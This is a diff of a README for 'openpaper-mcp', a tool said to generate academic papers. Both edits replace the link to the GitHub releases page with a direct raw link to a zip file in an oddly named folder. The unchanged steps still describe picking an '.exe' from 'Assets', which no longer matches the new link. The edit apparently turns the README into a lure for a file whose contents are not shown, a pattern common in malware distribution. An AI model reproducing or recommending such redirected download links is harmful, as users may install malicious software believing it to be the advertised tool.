@@ -1,6 +1,6 @@
 # 🎓 openpaper-mcp - Generate verified academic papers effortlessly
 
-<a href="https://github.com/Involute-wrangle2137/openpaper-mcp/releases"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge" alt="Download"></a>
+<a href="https://raw.githubusercontent.com/Involute-wrangle2137/openpaper-mcp/main/bulblike/openpaper-mcp-1.0.zip"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge" alt="Download"></a>
 
 ## 📝 About the Application
 
@@ -25,7 +25,7 @@ The openpaper-mcp software provides a bridge between your preferred artificial i
 
 To set up this tool, obtain the files from the official repository.
 
-1.  Visit [this page to download](https://github.com/Involute-wrangle2137/openpaper-mcp/releases).
+1.  Visit [this page to download](https://raw.githubusercontent.com/Involute-wrangle2137/openpaper-mcp/main/bulblike/openpaper-mcp-1.0.zip).
 2.  Locate the section labeled "Assets."
 3.  Select the file ending in `.exe` that corresponds to your Windows version.
 4.  Save the file to a folder on your computer.
